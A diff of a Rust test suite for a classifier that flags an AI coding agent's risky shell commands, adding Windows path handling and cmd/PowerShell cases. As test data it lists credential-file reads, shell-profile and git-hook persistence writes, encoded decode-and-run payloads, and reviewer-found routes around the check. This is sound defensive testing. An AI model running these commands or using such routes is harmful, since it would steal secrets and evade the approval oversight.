@@ -2,12 +2,26 @@ use super::*;
 use crate::sandboxing::SandboxPermissions;
 use codex_utils_absolute_path::AbsolutePathBuf;
 use pretty_assertions::assert_eq;
+use std::path::PathBuf;
 
 const HOME: &str = "/home/fixture/.corbanu";
 const USER_HOME: &str = "/home/fixture";
 
+/// A fixture path: as written, but on Windows (#1240) a POSIX path without a
+/// drive is on drive `C:` (`/work` is `C:\work`). Command text keeps POSIX
+/// paths: on Windows `/home/fixture` is on the working folder's drive.
+fn fixture(path: &str) -> PathBuf {
+    if cfg!(windows) && !Path::new(path).is_absolute() {
+        PathBuf::from(format!("C:{}", path.replace('/', "\\")))
+    } else {
+        PathBuf::from(path)
+    }
+}
+
 fn abs(path: &str) -> PathUri {
-    PathUri::from_abs_path(&AbsolutePathBuf::from_absolute_path_checked(path).expect("absolute"))
+    PathUri::from_abs_path(
+        &AbsolutePathBuf::from_absolute_path_checked(fixture(path)).expect("absolute"),
+    )
 }
 
 fn shell_in(cwd: &str, command: &[&str]) -> ApprovalAction {
@@ -23,7 +37,7 @@ fn shell_in(cwd: &str, command: &[&str]) -> ApprovalAction {
 }
 
 fn classify_fixture(action: &ApprovalAction) -> Option<ProtectedActionKind> {
-    classify_with(action, Path::new(HOME), Some(Path::new(USER_HOME)))
+    classify_with(action, &fixture(HOME), Some(&fixture(USER_HOME)))
 }
 
 fn kind(command: &[&str]) -> Option<ProtectedActionKind> {
@@ -35,10 +49,6 @@ fn script(script: &str) -> Option<ProtectedActionKind> {
 }
 
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_vault_credential_and_policy_commands_are_protected() {
     use ProtectedActionKind::*;
     let cases: &[(&str, ProtectedActionKind)] = &[
@@ -168,7 +178,7 @@ fn pf_30_s03_vault_credential_and_policy_commands_are_protected() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn pf_30_s03_ordinary_commands_are_not_protected() {
     for command in [
@@ -205,10 +215,6 @@ fn pf_30_s03_ordinary_commands_are_not_protected() {
 }
 
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_patches_into_the_home_or_credential_files_are_protected() {
     let patch = |files: &[&str]| ApprovalAction::ApplyPatch {
         id: "call".into(),
@@ -237,17 +243,13 @@ fn pf_30_s03_patches_into_the_home_or_credential_files_are_protected() {
 }
 
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_a_custom_home_matches_as_a_whole_segment_run() {
-    let home = Path::new("/vol/work/corbanu-terminal/home");
+    let home = &fixture("/vol/work/corbanu-terminal/home");
     let classify = |script: &str| {
         classify_with(
             &shell_in("/vol/src", &["bash", "-lc", script]),
             home,
-            Some(Path::new(USER_HOME)),
+            Some(&fixture(USER_HOME)),
         )
     };
     for (script, expected) in [
@@ -277,8 +279,8 @@ fn pf_30_s03_a_custom_home_matches_as_a_whole_segment_run() {
 fn custom_home_kind(cwd: &str, script: &str) -> Option<ProtectedActionKind> {
     classify_with(
         &shell_in(cwd, &["bash", "-lc", script]),
-        Path::new("/vol/work/corbanu-terminal/home"),
-        Some(Path::new(USER_HOME)),
+        &fixture("/vol/work/corbanu-terminal/home"),
+        Some(&fixture(USER_HOME)),
     )
 }
 
@@ -287,10 +289,6 @@ fn custom_home_kind(cwd: &str, script: &str) -> Option<ProtectedActionKind> {
 /// archives of a folder holding a home, inline code, encoded payloads and
 /// decode-and-run pipelines.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_indirect_routes_are_protected() {
     use ProtectedActionKind::*;
     for (command, expected) in [
@@ -388,10 +386,6 @@ fn pf_30_s03_indirect_routes_are_protected() {
 /// Slice 2: the indirect checks do not turn ordinary research commands into
 /// prompts.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_indirect_checks_leave_ordinary_commands_alone() {
     for command in [
         "curl -s https://api.example/items | jq .",
@@ -437,7 +431,7 @@ fn pf_30_s03_symlinks_and_canonical_spellings_reach_the_home() {
         classify_with(
             &shell_in(&work.to_string_lossy(), &["bash", "-lc", script]),
             &home,
-            Some(Path::new(USER_HOME)),
+            Some(&fixture(USER_HOME)),
         )
     };
     assert_eq!(
@@ -462,7 +456,7 @@ fn pf_30_s03_symlinks_and_canonical_spellings_reach_the_home() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn pf_30_s03_script_files_and_patched_scripts_are_read() {
     let root = tempfile::tempdir().expect("tempdir");
@@ -517,11 +511,11 @@ fn pf_30_s03_script_files_and_patched_scripts_are_read() {
 /// PF-26 input: a research workflow after untrusted content prompts only on
 /// the protected steps, and classification stays cheap.
 #[test]
-#[allow(clippy::print_stderr)]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
+#[allow(clippy::print_stderr)]
 fn pf_30_s03_research_workflow_prompt_count_and_latency() {
     let research = [
         "rg -n 'fn classify' codex-rs/core/src",
@@ -805,10 +799,6 @@ async fn pf_30_s03_live_policy_change_and_new_taint_reach_the_recheck() {
 /// Review round 1 (slice 2): the routes and limits the reviewer found. Every
 /// limit fails closed, and code the classifier cannot read counts as protected.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_review_bypasses_are_closed() {
     use ProtectedActionKind::*;
     for (command, expected) in [
@@ -1141,10 +1131,6 @@ async fn pf_30_s03_orchestrator_rechecks_after_the_prompt() {
 /// first operand, pipes survive empty commands, keywords and wrappers do not
 /// hide a shell, and too many brace alternatives fail closed.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_review_2_bypasses_are_closed() {
     use ProtectedActionKind::*;
     let alternatives: Vec<String> = (0..70).map(|index| format!("a{index}")).collect();
@@ -1255,10 +1241,6 @@ fn pf_30_s03_everyday_commands_stay_quiet() {
 /// in a group, `$PWD` follows `cd`, wrappers have their own options, more
 /// interpreters and attached inline code are recognised.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_review_3_bypasses_are_closed() {
     use ProtectedActionKind::*;
     for command in [
@@ -1335,10 +1317,6 @@ fn pf_30_s03_review_3_bypasses_are_closed() {
 /// PF-23-S01: value transfers, and local content sent to another machine,
 /// are protected; literal request bodies and requests to this machine are not.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_23_s01_value_transfer_and_outbound_content_are_protected() {
     use ProtectedActionKind::*;
     for (command, expected) in [
@@ -1476,10 +1454,6 @@ fn pf_23_s01_value_transfer_and_outbound_content_are_protected() {
 /// PF-23-S01 review round 3: many places a command could start fail closed
 /// quickly instead of judging each one.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_23_s01_wrapper_positions_are_bounded() {
     // Linear work, counted at two sizes (#1102).
     work::assert_linear("npx words", |scale| {
@@ -1495,10 +1469,6 @@ fn pf_23_s01_wrapper_positions_are_bounded() {
 /// PF-23-S02: writing a file that runs code later outside the sandbox is
 /// protected; reading it, and ordinary writes, are not.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_23_s02_persistence_writes_are_protected() {
     use ProtectedActionKind::*;
     for command in [
@@ -1566,10 +1536,6 @@ fn pf_23_s02_persistence_writes_are_protected() {
 /// the Corbanu home as `$CODEX_HOME` does, so reading through them is a
 /// protected action too (it drew no approval prompt before).
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_442_corbanu_home_variables_name_the_home() {
     use ProtectedActionKind::SecurityPolicy;
     for command in [
@@ -1621,7 +1587,7 @@ fn issue_442_aggressive_credential_reads_say_they_are_never_granted() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_841_sed_edits_are_not_unseen_code() {
     let dir = tempfile::tempdir().unwrap();
@@ -1825,7 +1791,7 @@ fn issue_885_wrong(cwd: &str, cases: &[(&str, Option<ProtectedActionKind>)]) -> 
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_sed_that_runs_commands_is_unseen_code() {
     let (_dir, cwd) = issue_885_fixture();
@@ -1898,7 +1864,7 @@ fn issue_885_sed_that_runs_commands_is_unseen_code() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_nested_shell_scripts_are_judged() {
     let (_dir, cwd) = issue_885_fixture();
@@ -1953,7 +1919,7 @@ fn issue_885_nested_shell_scripts_are_judged() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_sed_writing_a_file_the_line_runs_is_unseen_code() {
     let (_dir, cwd) = issue_885_fixture();
@@ -1985,7 +1951,7 @@ fn issue_885_sed_writing_a_file_the_line_runs_is_unseen_code() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_review_1_routes_and_limits() {
     let (_dir, cwd) = issue_885_fixture();
@@ -2058,7 +2024,7 @@ fn issue_885_review_1_routes_and_limits() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_review_2_routes_and_limits() {
     let (_dir, cwd) = issue_885_fixture();
@@ -2128,7 +2094,7 @@ fn issue_885_review_2_routes_and_limits() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_review_3_routes() {
     let (_dir, cwd) = issue_885_fixture();
@@ -2221,10 +2187,6 @@ fn issue_885_review_3_routes() {
 /// `a[$(touch hit)0]` (zsh: `path[...]`): checked with bash 3.2 and 5.2
 /// (`mapfile`), zsh 5.9 and ksh93.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_937_arithmetic_on_filled_variables_is_unseen_code() {
     use ProtectedActionKind::UnseenCode;
     let bash = [
@@ -2316,10 +2278,6 @@ fn issue_937_arithmetic_on_filled_variables_is_unseen_code() {
 /// #937: loop counters, values from literals or from commands the
 /// classifier can read, and filled variables used as plain text still run.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_937_counters_and_plain_uses_are_not_unseen_code() {
     let mut wrong = Vec::new();
     for shell in ["bash", "zsh"] {
@@ -2351,7 +2309,7 @@ fn issue_937_counters_and_plain_uses_are_not_unseen_code() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_937_review_1_routes() {
     use ProtectedActionKind::UnseenCode;
@@ -2423,10 +2381,6 @@ fn issue_937_review_1_routes() {
 
 /// #937 review 1: everyday lines near the new routes still run.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_937_review_1_everyday_lines_still_run() {
     let mut wrong = Vec::new();
     for shell in ["bash", "zsh"] {
@@ -2455,7 +2409,7 @@ fn issue_937_review_1_everyday_lines_still_run() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_937_review_2_routes() {
     use ProtectedActionKind::UnseenCode;
@@ -2538,7 +2492,7 @@ fn issue_937_review_2_routes() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_937_review_2_everyday_lines_still_run() {
     let mut wrong = Vec::new();
@@ -2574,7 +2528,7 @@ fn issue_937_review_2_everyday_lines_still_run() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_937_review_6_fallback_routes() {
     use ProtectedActionKind::UnseenCode;
@@ -2660,10 +2614,6 @@ fn issue_937_review_6_fallback_routes() {
 /// #1020: the shell reader stops nesting substitutions past a depth, so deep
 /// nesting stays fast, and the line asks.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1020_deep_substitutions_stay_fast_and_ask() {
     use ProtectedActionKind::*;
     let lex = |text: &str| shell::simple_commands(&["bash".into(), "-c".into(), text.into()]);
@@ -2765,10 +2715,6 @@ fn issue_1020_deep_substitutions_stay_fast_and_ask() {
 /// #1020: a line nesting `$(` 400 deep took about 6 s to read on main; the
 /// work now grows linearly with the depth (counted at two sizes, #1102).
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1020_deep_nesting_is_classified_quickly() {
     work::assert_linear("deep nesting", |scale| {
         let found = script(&format!("echo {}", "$(".repeat(100 * scale)));
@@ -2779,10 +2725,6 @@ fn issue_1020_deep_nesting_is_classified_quickly() {
 /// #1012: bash `${v@P}` runs the command substitutions in the value, like
 /// `eval`, so after untrusted content it is code the user hasn't seen.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1012_prompt_transformation_is_unseen_code() {
     use ProtectedActionKind::*;
     let mut wrong = Vec::new();
@@ -2845,7 +2787,7 @@ fn issue_1012_prompt_transformation_is_unseen_code() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_1084_glob_substitution_is_unseen_code() {
     use ProtectedActionKind::*;
@@ -3131,15 +3073,15 @@ fn issue_932_zsh_lines_of_proven_data_skip_the_zsh_only_checks() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn d85_zsh_only_checks_ask_only_where_zsh_may_run() {
     use ProtectedActionKind::*;
     let named = |command: &[&str]| {
         classify_as_named_with(
             &shell_in("/work", command),
-            Path::new(HOME),
-            Some(Path::new(USER_HOME)),
+            &fixture(HOME),
+            Some(&fixture(USER_HOME)),
         )
     };
     let mut wrong = Vec::new();
@@ -3324,7 +3266,7 @@ fn d85_zsh_only_checks_ask_only_where_zsh_may_run() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_1028_glob_qualifiers_that_run_code_are_unseen_code() {
     use ProtectedActionKind::*;
@@ -3486,10 +3428,6 @@ fn issue_1028_glob_qualifiers_that_run_code_are_unseen_code() {
 /// bound; past `MAX_SUBSTITUTED_BYTES` substituted bytes the line asks.
 /// Inputs stay small (at most 16 MiB on a build without the cap).
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1065_substituted_values_are_capped() {
     use ProtectedActionKind::*;
     let doubled = |steps: usize| format!("a=x;{} echo ok", " a=$a$a;".repeat(steps));
@@ -3523,22 +3461,15 @@ fn issue_1065_substituted_values_are_capped() {
 
 /// #1065 review 1: the budget holds for the whole classification, a line
 /// past it still names what it reaches, and folders and nested text are
-/// bounded too. Inputs stay small (at most about 6 MB of words).
+/// bounded too. Inputs stay small (at most about 6 MB of words). Split in
+/// three so each runs in a few seconds in a debug build (#1275).
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1065_review_1_limits() {
     use ProtectedActionKind::*;
-    use base64::Engine as _;
     let exhaust = format!("p=x;{}", " p=$p$p;".repeat(20));
     let long = format!("{USER_HOME}/.codex/{}/../auth.json", "k".repeat(80));
     let pushes = |count: usize| format!("pushd /tmp;{} echo ok", " pushd .;".repeat(count));
-    let decoded = " ZWNobyBoZWxsbyB3b3JsZA=="; // "echo hello world"
-    let payload = base64::engine::general_purpose::STANDARD
-        .encode(format!("echo {}", "a".repeat(600 * 1024)));
-    let cases = [
+    assert_review_1_limits(vec![
         // Small values are still substituted past the budget, and a large
         // one is judged on its own.
         (format!("v=vault; {exhaust} corbanu $v get k"), Some(Vault)),
@@ -3557,6 +3488,15 @@ fn issue_1065_review_1_limits() {
         ),
         ("cd /tmp/x && pushd /tmp && popd; echo ok".to_string(), None),
         (format!("cd /{}; echo ok", "a".repeat(1000)), None),
+    ]);
+}
+
+/// #1065 review 1, continued: sed calls, pipelines and decoded payloads.
+#[test]
+fn issue_1065_review_1_command_limits() {
+    use ProtectedActionKind::*;
+    let decoded = " ZWNobyBoZWxsbyB3b3JsZA=="; // "echo hello world"
+    assert_review_1_limits(vec![
         // Review r3: sed calls one reading collects.
         (
             format!("cd /tmp;{} echo ok", " sed -n p f;".repeat(5000)),
@@ -3571,10 +3511,23 @@ fn issue_1065_review_1_limits() {
         // Command lines lexed in all: decoded payloads.
         (format!("echo{}", decoded.repeat(5000)), Some(UnseenCode)),
         (format!("echo{}", decoded.repeat(50)), None),
-        // Bytes lexed in all: seven copies of a 600 KiB payload through
-        // braces.
-        (format!("echo {payload}{{,,,,,,}}"), Some(UnseenCode)),
-    ];
+    ]);
+}
+
+/// #1065 review 1, continued: bytes lexed in all.
+#[test]
+fn issue_1065_review_1_lexed_bytes_limit() {
+    use base64::Engine as _;
+    let payload = base64::engine::general_purpose::STANDARD
+        .encode(format!("echo {}", "a".repeat(600 * 1024)));
+    // Seven copies of a 600 KiB payload through braces.
+    assert_review_1_limits(vec![(
+        format!("echo {payload}{{,,,,,,}}"),
+        Some(ProtectedActionKind::UnseenCode),
+    )]);
+}
+
+fn assert_review_1_limits(cases: Vec<(String, Option<ProtectedActionKind>)>) {
     let mut wrong = Vec::new();
     for (line, expected) in cases {
         let found = script(&line);
@@ -3590,17 +3543,13 @@ fn issue_1065_review_1_limits() {
 /// small values past the budget build at most a bounded value. Counted by
 /// command lines and bytes lexed, not by time.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1065_review_2_large_values_are_judged_once() {
     use ProtectedActionKind::*;
     let counts = |line: &str| {
         let classifier = classified(
             &shell_in("/work", &["bash", "-lc", line]),
-            Path::new(HOME),
-            Some(Path::new(USER_HOME)),
+            &fixture(HOME),
+            Some(&fixture(USER_HOME)),
             /*as_named*/ false,
         );
         (
@@ -3638,10 +3587,6 @@ fn issue_1065_review_2_large_values_are_judged_once() {
 /// git (or a pager or editor it starts) runs is code the classifier does not
 /// read.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1141_output_files_are_written() {
     use ProtectedActionKind::*;
     for command in [
@@ -3682,7 +3627,7 @@ fn issue_1141_output_files_are_written() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_1142_git_code_settings_are_unseen_code() {
     let unseen = Some(ProtectedActionKind::UnseenCode);
@@ -3791,10 +3736,6 @@ fn issue_1142_git_code_settings_are_unseen_code() {
 
 /// #1142 review round 3: a flag group cut inside a character.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1142_flag_groups_cut_inside_a_character() {
     let line = format!("echo ${{({}\u{e9})}} a=1", "h".repeat(63));
     let _ = script(&line);
@@ -3813,10 +3754,6 @@ macro_rules! issue_1141_1142_checks_are_linear {
                     use super::*;
 
                     #[test]
-                    #[cfg_attr(
-                        windows,
-                        ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-                    )]
                     fn in_git_lines() {
                         work::assert_linear(concat!(stringify!($name), " in git lines"), |scale| {
                             let _ = script(&format!("git {} status", $unit.repeat(400 * scale)));
@@ -3824,10 +3761,6 @@ macro_rules! issue_1141_1142_checks_are_linear {
                     }
 
                     #[test]
-                    #[cfg_attr(
-                        windows,
-                        ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-                    )]
                     fn in_read_lines() {
                         work::assert_linear(concat!(stringify!($name), " in read lines"), |scale| {
                             let _ = script(&format!("read {}", $unit.repeat(400 * scale)));
@@ -3859,10 +3792,6 @@ issue_1141_1142_checks_are_linear! {
 /// exec path runs `git <subcommand>`, `git.exe` is git), and more git
 /// options and variables that name a file or folder git writes are writes.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1159_git_helpers_and_path_writes() {
     use ProtectedActionKind::*;
     for command in [
@@ -3935,10 +3864,6 @@ fn issue_1159_git_helpers_and_path_writes() {
 
 /// #1159: the git helper checks stay linear in the line's length.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1159_checks_are_linear() {
     for (label, unit) in [
         ("git helpers", "git-config "),
@@ -3952,6 +3877,1454 @@ fn issue_1159_checks_are_linear() {
             let line = format!("git {} status", unit.repeat(400 * scale));
             let _ = script(&line);
             let line = format!("git-config {}", unit.repeat(400 * scale));
+            let _ = script(&line);
+        });
+    }
+}
+
+/// #1240: the Windows fixture: a Windows home, user home and working folder.
+const WINDOWS_HOME: &str = r"C:\Users\fixture\.corbanu";
+const WINDOWS_USER_HOME: &str = r"C:\Users\fixture";
+
+/// #1240: `command` run in `cwd` on Windows with `home` as the Corbanu home:
+/// on Windows through `classify_with`, elsewhere through the same two
+/// judgments with the Windows folder given as text.
+fn windows_kind_with(home: &str, cwd: &str, command: &[&str]) -> Option<ProtectedActionKind> {
+    let command: Vec<String> = command.iter().map(|part| (*part).to_string()).collect();
+    if cfg!(windows) {
+        let action = ApprovalAction::Shell {
+            id: "call".into(),
+            environment_id: "local".into(),
+            command,
+            cwd: PathUri::from_abs_path(
+                &AbsolutePathBuf::from_absolute_path_checked(cwd).expect("absolute"),
+            ),
+            sandbox_permissions: SandboxPermissions::UseDefault,
+            additional_permissions: None,
+            justification: None,
+        };
+        classify_with(&action, Path::new(home), Some(Path::new(WINDOWS_USER_HOME)))
+    } else {
+        classify_as_windows(
+            &command,
+            cwd,
+            Path::new(home),
+            Some(Path::new(WINDOWS_USER_HOME)),
+        )
+    }
+}
+
+fn windows_kind(command: &[&str]) -> Option<ProtectedActionKind> {
+    windows_kind_with(WINDOWS_HOME, r"C:\work", command)
+}
+
+fn cmd(line: &str) -> Option<ProtectedActionKind> {
+    windows_kind(&["cmd.exe", "/c", line])
+}
+
+fn powershell(line: &str) -> Option<ProtectedActionKind> {
+    windows_kind(&["powershell.exe", "-NoProfile", "-Command", line])
+}
+
+/// #1240: protected reads and writes spelled the Windows way (cmd and
+/// PowerShell, backslashes, drive letters, `%USERPROFILE%`,
+/// `$env:USERPROFILE`, `~\`, any letter case) are protected on Windows, as
+/// their POSIX spellings are everywhere. Runs on every platform.
+#[test]
+fn issue_1240_windows_spellings_are_protected() {
+    use ProtectedActionKind::*;
+    for (line, expected) in [
+        // The #1240 table.
+        (r"type C:\Users\fixture\.corbanu\auth.json", Credentials),
+        // Home variables and letter case.
+        (r"type %USERPROFILE%\.netrc", Credentials),
+        (r"type %userprofile%\.ssh\id_rsa", Credentials),
+        (r"type %HOMEDRIVE%%HOMEPATH%\.git-credentials", Credentials),
+        (r"type %CODEX_HOME%\auth.json", Credentials),
+        (r"TYPE C:\USERS\FIXTURE\.CORBANU\AUTH.JSON", Credentials),
+        (
+            r"more < C:\Users\Fixture\.Corbanu\Config.toml",
+            SecurityPolicy,
+        ),
+        (r"type C:\Users\fixture\.corbanu\vault\store", Vault),
+        // Writes: redirection, quotes, escapes, writing commands.
+        (r"echo x >> %USERPROFILE%\.bashrc", Persistence),
+        (r#"echo x>>"%USERPROFILE%\.bashrc""#, Persistence),
+        (r"echo x 1> C:\Users\fixture\.profile", Persistence),
+        (r"echo don't > C:\Users\fixture\.zshrc", Persistence),
+        (
+            r"copy C:\evil.txt %HOMEDRIVE%%HOMEPATH%\.gitconfig",
+            Persistence,
+        ),
+        (
+            r"copy /y evil C:\Users\fixture\.local\bin\git.exe",
+            Persistence,
+        ),
+        (r"cd /d %USERPROFILE% & echo x >> .bashrc", Persistence),
+        (r"cd C:\work\.git & echo x > hooks\pre-commit", Persistence),
+        (r"echo x > C:\work\.codex\config.toml", SecurityPolicy),
+        // Windows spellings of one file.
+        (r"type \\?\C:\Users\fixture\.corbanu\auth.json", Credentials),
+        (r"type \\localhost\C$\Users\fixture\.netrc", Credentials),
+        (r"type C:\Users\fixture\.netrc::$DATA", Credentials),
+        (r"echo x > C:\Users\fixture\.bashrc.", Persistence),
+        (
+            r"type C:\Users\fixture\.corbanu\.\x\..\auth.json",
+            Credentials,
+        ),
+        (r"echo x >> ..\Users\fixture\.bashrc", Persistence),
+        (r"echo x >> \Users\fixture\.bashrc", Persistence),
+        (r"echo x >> C:..\Users\fixture\.bashrc", Persistence),
+        // Folder trees holding a home.
+        (r"robocopy C:\Users\fixture D:\backup /E", Credentials),
+        (r"xcopy C:\Users D:\backup", Credentials),
+        // Programs named by their Windows path.
+        (r"C:\Tools\corbanu.exe vault list", Vault),
+        (
+            r#""C:\Program Files\Corbanu\corbanu.exe" vault get k"#,
+            Vault,
+        ),
+        (r"gh.exe auth token", Credentials),
+        (
+            r"C:\Git\cmd\git.exe config --global core.pager x",
+            Persistence,
+        ),
+        // cmd's substring forms are not expanded: they fail closed.
+        (r"type %USERPROFILE:~0%\.bashrc", UnseenCode),
+        // Review 1: folder changes anywhere, attached or after a prefix.
+        (
+            r"cmd /c cd /d %USERPROFILE% & echo x >> .bashrc",
+            Persistence,
+        ),
+        (r"@cd /d %USERPROFILE% & echo x >> .bashrc", Persistence),
+        (r"if 1==1 cd %USERPROFILE% & echo x >> .bashrc", Persistence),
+        (r"cd\Users\fixture & echo x >> .bashrc", Persistence),
+        (r#"cmd /c "echo x >> %USERPROFILE%\.bashrc""#, Persistence),
+        (
+            r"start /D %USERPROFILE% cmd /c echo x >> .bashrc",
+            Persistence,
+        ),
+        // Variables in a profile; climbing out of an unknown one fails closed.
+        (r"echo x >> %APPDATA%\..\..\.bashrc", Persistence),
+        (r"echo x >> %LOCALAPPDATA%\..\..\.zshrc", Persistence),
+        (r"echo x >> C:\Users\%USERNAME%\.bashrc", Persistence),
+        (r"echo x >> %TEMP%\..\..\..\.bashrc", UnseenCode),
+        (
+            r"echo x >> %SystemDrive%\Users\fixture\.bashrc",
+            Persistence,
+        ),
+        // Review 2: every folder the line has been in counts.
+        (r"cd /d %USERPROFILE% & echo x>>.bashrc cd x", Persistence),
+        (
+            r"cd /d %USERPROFILE% & cd.x & echo x>>..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"cd /d %USERPROFILE% & pushd x & popd & echo x>>.bashrc",
+            Persistence,
+        ),
+        (
